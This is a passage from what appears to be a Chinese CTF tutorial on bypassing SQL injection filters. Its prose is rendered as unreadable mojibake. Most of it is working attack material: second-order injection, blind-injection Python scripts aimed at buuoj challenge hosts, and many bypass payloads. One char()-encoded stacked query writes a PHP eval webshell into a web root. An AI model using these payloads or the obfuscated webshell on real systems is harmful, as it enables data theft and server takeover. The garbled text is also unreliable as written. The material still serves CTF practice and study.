ä¼šæ˜¯æ’å…¥è¯­å¥ï¼Œæˆ‘ä»¬æ§åˆ¶è‡ªå·±æƒ³è¦æŸ¥è¯¢çš„è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­å†å»æ‰¾ä¸€ä¸ªèƒ½æ˜¾ç¤ºæ’å…¥æ•°æ®çš„å›æ˜¾çš„åœ°æ–¹ï¼ˆå¯èƒ½æ˜¯ç™»é™†åçš„ç”¨æˆ·åç­‰ç­‰ã€ä¹Ÿæœ‰å¯èƒ½æ˜¯åˆ é™¤åæ˜¾ç¤ºåˆ é™¤å†…å®¹çš„åœ°æ–¹~ï¼‰ï¼Œæ¶æ„æ’å…¥æŸ¥è¯¢è¯­å¥çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š\n\n```bash\ninsert into users(id,username,password,email) values(1,'0'+hex(database())+'0','0'+hex(hex(user()))+'0','123@qq.com')\n\ninsert into users(id,username,password,email) values(1,'0'+substr((select hex(hex(select * from flag))),1,10)+'0','123456','123@qq.com')\n```\néœ€è¦å¯¹åç«¯çš„SQLè¯­å¥æœ‰ä¸€ä¸ªçŒœæµ‹\n\nè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å°†è¦æŸ¥è¯¢çš„å‡½æ•°æ’å…¥ï¼Œå› ä¸ºå¦‚æœç›´æ¥æ’å…¥çš„è¯ï¼Œ'database()'ä¼šè¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•é—­åˆå‰åå•å¼•å·çš„åŒæ—¶å°†æˆ‘ä»¬çš„æŸ¥è¯¢æ’å…¥ï¼Œå°±å‡ºç°äº†'0'+database()+'0'è¿™æ ·çš„æ„é€ ï¼Œä½†æ˜¯è¿™ä¸ªçš„å›æ˜¾æ˜¯0ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬è¿›è¡Œäº†hexç¼–ç ä¹‹åå°±èƒ½æ­£å¸¸çš„æŸ¥è¯¢äº†ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å‡ºç°çš„'0'+hex(database())+'0'\n\n\n### æ³¨å…¥æµç¨‹ \né¦–å…ˆæ‰¾åˆ°æ’å…¥ç‚¹ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œregister.phpè¿™ç§ï¼Œå…ˆç®€å•çš„æŸ¥çœ‹ä¸€ä¸‹æ³¨å†Œåæœ‰æ²¡æœ‰ä»€ä¹ˆæ³¨å†Œæ—¶å†™å…¥çš„ä¿¡æ¯åœ¨ä¹‹ååˆå›æ˜¾çš„ï¼Œè‹¥æœ‰å›æ˜¾çŒœæµ‹ä¸ºäºŒæ¬¡æŸ¥è¯¢ã€‚\n\n```bash\ninsert into users(id,username,password,email) values(1,'0'+hex(database())+'0','0'+hex(hex(user()))+'0','123@qq.com')\n\ninsert into users(id,username,password,email) values(1,'0'+substr((select hex(hex(select * from flag))),1,10)+'0','123456','123@qq.com')\n```\næ„é€ ç±»ä¼¼äºvaluesä¸­çš„å‚æ•°è¿›è¡Œæ³¨å†Œç­‰æ“ä½œï¼Œç„¶åè¿›è¡ŒæŸ¥çœ‹ï¼Œå°†hexç¼–ç è§£ç å³å¯ï¼Œå¯èƒ½ä¼šæœ‰å…¶ä»–çš„å…ˆé™åˆ¶ï¼Œæ¯”å¦‚è¶…è¿‡10ä½å°±ä¼šè½¬åŒ–ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨from forè¯­å¥æ¥è¿›è¡Œä¸€ä¸ªé™åˆ¶ï¼Œå¯ä»¥ç¼–å†™è„šæœ¬ã€‚\n```python\nimport requests\nimport string\nimport re as r\nimport time\nch = string.ascii_lowercase+string.digits+'-}'+'{'\n\nre = requests.session()\nurl = 'http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/'\n\ndef register(email,username):\n    url1 = url+'register.php'\n    data = dict(email = email, username = username,password = '123')\n    html = re.post(url1,data=data)\n    html.encoding = 'utf-8'\n    return html\n\ndef login(email):\n    url2 = url+'login.php'\n    data = dict(email = email,password = '123')\n    html = re.post(url2, data=data)\n    html.encoding = 'utf-8'\n    return html\n\n\nhex_flag = ''\nfor j in range(0,17):\n    payload = \"0'+(select substr(hex(hex((select * from flag))) from {} for {}))+'0\".format(int(j)*10+1,10)\n    email = '{}@qq.com'.format(str(j)+'14')\n    html = register(email,payload)\n    # print html.text\n    html = login(email)\n    try:\n        res = r.findall(r'<span class=\"user-name\">(.*?)</span>',html.text,r.S)\n        hex_flag += str(res[0]).strip()\n        print(hex_flag)\n    except:\n        pass\n    time.sleep(1)\nprint( hex_flag.decode('hex').decode('hex'))\n```\n\n## å¸¸è§ç»•è¿‡\n###  ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡\nMysqlä¸­å¸¸è§çš„æ³¨é‡Šç¬¦\n```bash\nã€#    %23    --+æˆ–-- -    ;%00\n```\nå¦‚æœæ‰€æœ‰çš„æ³¨é‡Šç¬¦å…¨éƒ¨è¢«è¿‡æ»¤äº†ï¼ŒæŠŠæˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨å¼•å·è¿›è¡Œé—­åˆï¼Œè¿™ç§æ–¹æ³•å¾ˆå¥½ç”¨ã€‚\n\n### å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡\n```bash\n# å¤§å°å†™ç»•è¿‡\n-1' UnIoN SeLeCt 1,2,database()--+\n\n# åŒå†™ç»•è¿‡\n-1' uniunionon selselectect 1,2,database()--+\n\n# å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡\n1';set @a=concat(\"sel\",\"ect * from users\");prepare sql from @a;execute sql;\n```\n\n### è¿‡æ»¤ andã€or ç»•è¿‡\nç®¡é“ç¬¦\n```bash\nand => &&\nor => ||\n```\n\n###  ä½¿ç”¨^è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡\nå¼‚æˆ–è¿ç®—è§„åˆ™:\n1^1=0 0^0=0 0^1=1\n1^1^1=0 1^1^0=0\næ„é€ payload:'^ascii(mid(database(),1,1)=98)^0\næ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª^0æˆ–1æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„.\n\n\n### è¿‡æ»¤ç©ºæ ¼ç»•è¿‡\nä»¥ä¸‹å­—ç¬¦å¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼š\n```bash\n# ä½¿ç”¨æ³¨é‡Šç¬¦/**/ä»£æ›¿ç©ºæ ¼:\nselect/**/database();\n\n# ä½¿ç”¨åŠ å·+ä»£æ›¿ç©ºæ ¼:(åªé€‚ç”¨äºGETæ–¹æ³•ä¸­)\nselect+database();\n# æ³¨æ„: åŠ å·+åœ¨URLä¸­ä½¿â½¤è®°å¾—ç¼–ç ä¸º%2B: select%2Bdatabase(); (pythonä¸­ä¸ç”¨)\n\n# ä½¿â½¤æ‹¬å·åµŒå¥—:\nselect(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());\n\n# ä½¿â½¤å…¶ä»–ä¸å¯â»…å­—ç¬¦ä»£æ›¿ç©ºæ ¼:\n%09, %0a, %0b, %0c, %0d, %a0\n\n#åˆ©ç”¨``åˆ†éš”è¿›è¡Œç»•è¿‡\nselect host,user from user where user='a'union(select`table_name`,`table_type`from`information_schema`.`tables`);\n```\nåŒæ—¶ä»»ç„¶å¯ä»¥åˆ©ç”¨å¼‚æˆ–ç¬¦å·è¿›è¡Œç›²æ³¨ï¼Œæˆ‘iä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„payloadä¸­å®Œå…¨å¯ä»¥ä¸å­˜åœ¨ç©ºæ ¼ã€‚\n\n### è¿‡æ»¤æ‹¬å·ç»•è¿‡\nåˆ©ç”¨ order by è¿›è¡Œå¸ƒå°”ç›²æ³¨\nä¸Šé¢æœ‰\n\n### è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ=ã€<ã€>ï¼‰ç»•è¿‡\næ¯”è¾ƒç¬¦å·ä¸€èˆ¬ä¹Ÿåªå‡ºç°åœ¨ç›²æ³¨ä¸­ï¼Œæ‰€ä»¥éƒ½å°½å¯èƒ½æ­é…äº†è„šæœ¬ã€‚\n\n### ä½¿ç”¨ in() ç»•è¿‡\n```bash\n/?id=' or ascii(substr((select database()),1,1)) in(114)--+    // é”™è¯¯\n/?id=' or ascii(substr((select database()),1,1)) in(115)--+    // æ­£å¸¸å›æ˜¾\n\n/?id=' or substr((select database()),1,1) in('s')--+    // æ­£å¸¸å›æ˜¾\n```\nç»¼ä¸Šæ‰€è¿°ï¼Œå¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œäºæ˜¯å†™ä¸ªGETçš„äºŒåˆ†æ³•ç›²æ³¨è„šæœ¬ï¼š\n```python\nimport requests\n\nurl = \"http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=\"\n\npayload = \"' or ascii(substr((select database()),{0},1)) in({1})--+\"\nflag = ''\nif __name__ == \"__main__\":\n    for i in range(1, 100):\n        for j in range(37,128):\n            url = \"http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=' or ascii(substr((select database()),{0},1)) in({1})--+\".format(i,j)\n            r = requests.get(url=url)\n            if \"You are in\" in r.text:\n                flag += chr(j)\n                print(flag)\n```\n\n### LIKE æ³¨å…¥\nåœ¨LIKEå­å¥ä¸­ï¼Œç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¸‹åˆ’çº¿ _ é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚åŒ¹é…æˆåŠŸåˆ™è¿”å›1ï¼Œåä¹‹è¿”å›0ï¼Œå¯ç”¨äºsqlç›²æ³¨ã€‚\n\n1. åˆ¤æ–­æ•°æ®åº“é•¿åº¦\nå¯ç”¨length()å‡½æ•°ï¼Œä¹Ÿå¯ç”¨_ï¼Œå¦‚ï¼š\n```bash\n/?id=' or database() like '________'--+  // å›æ˜¾æ­£å¸¸\n```\n\n2.  åˆ¤æ–­æ•°æ®åº“å\n```bash\n/?id=' or database() like 's%' --+\n/?id=' or (select database()) like 's%' --+\næˆ–è€…:\n/?id=' or database() like 's_______' --+\n/?id=' or (select database()) like 's_______' --+\n```\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯sã€‚\n\nç»¼ä¸Šæ‰€è¿°ï¼Œå¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œäºæ˜¯å†™ä¸ªGETçš„äºŒåˆ†æ³•ç›²æ³¨è„šæœ¬ï¼š\n```python\nimport requests\nimport string\n\n# strs = string.printable\nstrs = string.ascii_letters + string.digits + '_'\nurl = \"http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=\"\n\npayload = \"' or (select database()) like '{}%'--+\"\n\nif __name__ == \"__main__\":\n    name = ''\n    for i in range(1, 40):\n        char = ''\n        for j in strs:\n            payloads = payload.format(name + j)\n            urls = url + payloads\n            r = requests.get(urls)\n            if \"You are in\" in r.text:\n                name += j\n                print(j, end='')\n                char = j\n                break\n        if char == '#':\n            break\n```\n\n\n### REGEXP æ³¨å…¥\nREGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚REGEXPæ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚\n\n1. åˆ¤æ–­æ•°æ®åº“é•¿åº¦\n```bash\n/?id=' or (length(database())) regexp 8 --+  // å›æ˜¾æ­£å¸¸\n```\n\n2. åˆ¤æ–­æ•°æ®åº“å\n```bash\n/?id=' or database() regexp '^s'--+    // å›æ˜¾æ­£å¸¸\n/?id=' or database() regexp 'se'--+    // å›æ˜¾æ­£å¸¸, ä¸é€‚ç”¨^å’Œ$è¿›è¡ŒåŒ¹é…ä¹Ÿå¯ä»¥\n/?id=' or database() regexp '^sa'--+   // æŠ¥é”™\n/?id=' or database() regexp 'y$'--+    // å›æ˜¾æ­£å¸¸\n```\n\nè„šæœ¬ï¼š\n```python\nimport requests\nimport string\n\n# strs = string.printable\nstrs = string.ascii_letters + string.digits + '_'\nurl = \"http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=\"\n\npayload = \"' or (select database()) regexp '^{}'--+\"\n\nif __name__ == \"__main__\":\n    name = ''\n    for i in range(1, 40):\n        char = ''\n        for j in strs:\n            payloads = payload.format(name + j)\n            urls = url + payloads\n            r = requests.get(urls)\n            if \"You are in\" in r.text:\n                name += j\n                print(j, end='')\n                char = j\n                break\n        if char == '#':\n            break\n```\nä»¥ä¸Šè„šæœ¬éƒ½è¦æ³¨æ„æ˜¯æŒæ¡ç¼–å†™æ€è·¯ï¼Œä¸æ˜¯å¹²æŠ„è„šæœ¬ã€‚\n\n### å®½å­—èŠ‚æ³¨å…¥\nå‰ç½®çŸ¥è¯†\n\n**magic_quotes_gpc ï¼ˆé­”æœ¯å¼•å·å¼€å…³**\nmagic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰ï¼špostã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ã€‚\n\nå•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\\ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ï¼Œæˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿å¦‚æœä¸èƒ½é—­åˆï¼Œé‚£æˆ‘ä»¬çš„è¾“å…¥å°±ä¸ä¼šå½“ä½œä»£ç æ‰§è¡Œï¼Œå°±æ— æ³•äº§ç”ŸSQLæ³¨å…¥ã€‚\n\n**addslashes()å‡½æ•°**\n\nè¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²\n\né¢„å®šä¹‰å­—ç¬¦ï¼šå•å¼•å·ï¼ˆ'ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ\"ï¼‰ï¼Œåæ–œæ ï¼ˆ\\ï¼‰ï¼ŒNULL\n\nå®½å­—èŠ‚æ¦‚å¿µï¼š\n1. å•å­—èŠ‚å­—ç¬¦é›†ï¼šæ‰€æœ‰çš„å­—ç¬¦éƒ½ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œæ¯”å¦‚ ASCII ç¼–ç (0-127)\n2. å¤šå­—èŠ‚å­—ç¬¦é›†ï¼šåœ¨å¤šå­—èŠ‚å­—ç¬¦é›†ä¸­ï¼Œä¸€éƒ¨åˆ†å­—èŠ‚ç”¨å¤šä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œå¦ä¸€éƒ¨åˆ†ï¼ˆå¯èƒ½æ²¡æœ‰ï¼‰ç”¨å•ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚\n3. UTF-8 ç¼–ç ï¼š æ˜¯ä¸€ç§ç¼–ç çš„ç¼–ç æ–¹å¼ï¼ˆå¤šå­—èŠ‚ç¼–ç ï¼‰ï¼Œå®ƒå¯ä»¥ä½¿ç”¨1~4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œæ ¹æ®ä¸åŒçš„ç¬¦å·è€Œå˜åŒ–å­—èŠ‚é•¿åº¦ã€‚\n4. å¸¸è§çš„å®½å­—èŠ‚ï¼š GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS GB2312 ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå¯ä»¥æ”¶é›†å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥çš„ç¼–ç ã€‚\n5. å®½å­—èŠ‚æ³¨å…¥æ—¶åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—\n\nå®½å­—èŠ‚SQLæ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸ºéè‹±æ–‡ç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚\n\nä¾‹å¦‚è¯´MySqlçš„ç¼–ç è®¾ç½®ä¸ºäº†SET NAMES 'gbk'æˆ–æ˜¯ SET character_set_client =gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚\n\nå®½å­—èŠ‚SQLæ³¨å…¥çš„æ ¹æœ¬åŸå› :\n\nå®½å­—èŠ‚SQLæ³¨å…¥å°±æ˜¯PHPå‘é€è¯·æ±‚åˆ°MySqlæ—¶ä½¿ç”¨äº†è¯­å¥\n\nSET NAMES 'gbk' æˆ–æ˜¯SET character_set_client =gbk è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ï¼Œä½†æ˜¯åˆç”±äºä¸€äº›ä¸ç»æ„çš„å­—ç¬¦é›†è½¬æ¢å¯¼è‡´äº†å®½å­—èŠ‚æ³¨å…¥ã€‚\n\nmagic_quotes_gpcçš„ä½œç”¨ï¼šå½“PHPçš„ä¼ å‚ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦å°±ä¼šåœ¨å‰é¢åŠ è½¬ä¹‰å­—ç¬¦'\\',æ¥åšä¸€å®šçš„è¿‡æ»¤\n\nä¸ºäº†ç»•è¿‡magic_quotes_gpcçš„\\,äºæ˜¯ä¹æˆ‘ä»¬å¼€å§‹å¯¼å…¥å®½å­—èŠ‚çš„æ¦‚å¿µ\n\næˆ‘ä»¬å‘ç°\\çš„ç¼–ç æ˜¯%5cï¼Œç„¶åæˆ‘ä»¬ä¼šæƒ³åˆ°ä¼ å‚ä¸€ä¸ªå­—ç¬¦æƒ³åŠæ³•å‡‘æˆä¸€ä¸ªgbkå­—ç¬¦,ä¾‹å¦‚ï¼šâ€˜é‹â€™å­—æ˜¯%df%5c\n\n```bash\nSELECT * FROM users WHERE id='1\\'' LIMIT 0,1\n```\n\nè¿™æ¡è¯­å¥å› ä¸º\\ä½¿æˆ‘ä»¬æ— æ³•å»æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç”¨%dfåƒåˆ°%5c,å› ä¸ºå¦‚æœç”¨GBKç¼–ç çš„è¯è¿™ä¸ªå°±æ˜¯é‹ï¼Œç„¶åæˆåŠŸç»•è¿‡\n```bash\nSELECT * FROM users WHERE id='1ï¿½\\'#' LIMIT 0,1\n```\n\nè™½ç„¶æ˜¯å†™åœ¨äº†è¿‡æ»¤å¼•å·çš„ä½ç½®ä½†æ˜¯å…¶å®ä¸æ­¢é€‚ç”¨äºè¿‡æ»¤å¼•å·\nä½¿ç”¨åæ–œæ  \\ é€ƒé€¸ Sql è¯­å¥\nå¦‚æœæ²¡æœ‰è¿‡æ»¤åæ–œæ çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åæ–œæ å°†åé¢çš„å¼•å·è½¬ä¹‰ï¼Œä»è€Œé€ƒé€¸åé¢çš„ Sql è¯­å¥ã€‚\n\nå‡è®¾sqlè¯­å¥ä¸ºï¼š\n```bash\nselect username, password from users where username='$username' and password='$password';\n```\n\nå‡è®¾è¾“å…¥çš„ç”¨æˆ·åæ˜¯ admin\\ï¼Œå¯†ç è¾“å…¥çš„æ˜¯ or 1# æ•´ä¸ªSQLè¯­å¥å˜æˆäº†\n```bash\nselect username,password from users where username='admin\\' and password=' or 1#'\n```\n\nç”±äºå•å¼•å·è¢«è½¬ä¹‰ï¼Œand password=è¿™éƒ¨åˆ†éƒ½æˆäº†usernameçš„ä¸€éƒ¨åˆ†ï¼Œå³\n```bash\nusername='admin\\' and password='\n```\nè¿™æ · or 1 å°±é€ƒé€¸å‡ºæ¥äº†ï¼Œç”±æ­¤å¯æ§ï¼Œå¯ä½œä¸ºæ³¨å…¥ç‚¹äº†ã€‚\n\n### å †å æ³¨å…¥æ—¶åˆ©ç”¨ MySql é¢„å¤„ç†\nåœ¨é‡åˆ°å †å æ³¨å…¥æ—¶ï¼Œå¦‚æœselectã€renameã€alterå’Œhandlerç­‰è¯­å¥éƒ½è¢«è¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨MySqlé¢„å¤„ç†è¯­å¥é…åˆconcatæ‹¼æ¥æ¥æ‰§è¡Œsqlè¯­å¥æ‹¿flagã€‚\n\n1. PREPAREï¼šå‡†å¤‡ä¸€æ¡SQLè¯­å¥ï¼Œå¹¶åˆ†é…ç»™è¿™æ¡SQLè¯­å¥ä¸€ä¸ªåå­—(hello)ä¾›ä¹‹åè°ƒç”¨\n2. EXECUTEï¼šæ‰§è¡Œå‘½ä»¤\n3. DEALLOCATE PREPAREï¼šé‡Šæ”¾å‘½ä»¤\n4. SETï¼šç”¨äºè®¾ç½®å˜é‡(@a)\n\n```bash\n1';sEt @a=concat(\"sel\",\"ect flag from flag_here\");PRepare hello from @a;execute hello;#\n```\nè¿™é‡Œè¿˜ç”¨å¤§å°å†™ç®€å•ç»•äº†ä¸€ä¸‹å…¶ä»–è¿‡æ»¤\n\n**MySql é¢„å¤„ç†é…åˆåå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—**\nåŸºæœ¬åŸç†å¦‚ä¸‹ï¼š\n```bash\nmysql> select hex('show databases');\n+------------------------------+\n| hex('show databases;')       |\n+------------------------------+\n| 73686F7720646174616261736573 |\n+------------------------------+\n1 row in set (0.01 sec)\n\nmysql> set @b=0x73686F7720646174616261736573;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> prepare test from @b;\nQuery OK, 0 rows affected (0.02 sec)\nStatement prepared\n\nmysql> execute test;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| challenges         |\n| mysql              |\n| performance_schema |\n| security           |\n| test               |\n+--------------------+\n6 rows in set (0.02 sec)\n```\nå³payloadç±»ä¼¼å¦‚ä¸‹ï¼š\n```bash\n1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#\n```\n\n**MySqlé¢„å¤„ç†é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—**\nåŸç†å°±æ˜¯å€ŸåŠ©char()å‡½æ•°å°†asciiç è½¬åŒ–ä¸ºå­—ç¬¦ç„¶åå†ä½¿ç”¨concat()å‡½æ•°å°†å­—ç¬¦è¿æ¥èµ·æ¥ï¼Œæœ‰äº†å‰é¢çš„åŸºç¡€è¿™é‡Œåº”è¯¥å¾ˆå¥½ç†è§£äº†ï¼š\n\n```bash\nset @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;\n```\n\nä¹Ÿå¯ä»¥ä¸ç”¨concatå‡½æ•°ï¼Œç›´æ¥ç”¨charå‡½æ•°ä¹Ÿå…·æœ‰è¿æ¥åŠŸèƒ½ï¼š\n```bash\nset @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;\n```\n\n### è¿‡æ»¤é€—å·ç»•è¿‡\nå½“é€—å·è¢«è¿‡æ»¤äº†ä¹‹åï¼Œæˆ‘ä»¬ä¾¿ä¸èƒ½å‘ä¸‹é¢è¿™æ ·æ­£å¸¸çš„æ—¶å€™substr()å‡½æ•°å’Œlimitè¯­å¥äº†ï¼š\n```bash\nselect substr((select database()),1,1);\nselect * from users limit 0,1;\n```\n\n**ä½¿ç”¨from...for...ç»•è¿‡**\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ from...for.. è¯­å¥æ›¿æ¢ substr() å‡½æ•°é‡Œçš„ ,1,1ï¼š\n```bash\nselect substr((select database()) from 1 for 1);\n# æ­¤æ—¶ from 1 for 1 ä¸­çš„ä¸¤ä¸ª1åˆ†åˆ«ä»£æ›¿ substr() å‡½æ•°é‡Œçš„ä¸¤ä¸ª1\n\nselect substr((select database()) from 1 for 1);    # s\nselect substr((select database()) from 2 for 1);    # e\nselect substr((select database()) from 3 for 1);    # c\nselect substr((select database()) from 4 for 1);    # u\nselect substr((select database()) from 5 for 1);    # r\nselect substr((select database()) from 6 for 1);    # i\nselect substr((select database()) from 7 for 1);    # t\nselect substr((select database()) from 8 for 1);    # y\n\n# å¦‚æœè¿‡æ»¤äº†ç©ºæ ¼, åˆ™å¯ä»¥ä½¿ç”¨æ‹¬å·æ¥ä»£æ›¿ç©ºæ ¼:\nselect substr((select database())from(1)for(1));    # s\nselect substr((select database())from(2)for(1));    # e\nselect substr((select database())from(3)for(1));    # c\nselect substr((select database())from(4)for(1));    # u\nselect substr((select database())from(5)for(1));    # r\nselect substr((select database())from(6)for(1));    # i\nselect substr((select database())from(7)for(1));    # t\nselect substr((select database())from(8)for(1));    # y\n```\nå³ï¼Œfromç”¨æ¥æŒ‡å®šä»ä½•å¤„å¼€å§‹æˆªå–ï¼Œforç”¨æ¥æŒ‡å®šæˆªå–çš„é•¿åº¦ï¼Œå¦‚æœä¸åŠ forçš„è¯åˆ™ from 1 å°±ç›¸å½“äºä»å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½ä¸€ç›´æˆªå–åˆ°æœ€åï¼š\n```bash\n\nselect substr((select database()) from 1);    # security\nselect substr((select database()) from 2);    # ecurity\nselect substr((select database()) from 3);    # curity\nselect substr((select database()) from 4);    # urity\nselect substr((select database()) from 5);    # rity\nselect substr((select database()) from 6);    # ity\nselect substr((select database()) from 7);    # ty\nselect substr((select database()) from 8);    # y\n\n# ä¹Ÿå¯ä»¥ä½¿ç”¨è´Ÿæ•°æ¥å€’ç€æˆªå–:\nselect substr((select database())from(-1));    # y\nselect substr((select database())from(-2));    # ty\nselect substr((select database())from(-3));    # ity\nselect substr((select database())from(-4));    # rity\nselect substr((select database())from(-5));    # urity\nselect substr((select database())from(-6));    # curity\nselect substr((select database())from(-7));    # ecurity\nselect substr((select database())from(-8));    # security\n```\n\n**ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡**\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ offset è¯­å¥æ›¿æ¢ limit è¯­å¥é‡Œçš„é€—å·ï¼š\n```bash\nselect * from users limit 1 offset 2;\n# æ­¤æ—¶ limit 1 offset 2 å¯ä»¥ä»£æ›¿ limit 1,2\n```\n\n**åˆ©ç”¨joinä¸åˆ«åç»•è¿‡**\n```bash\nselect host,user from user where 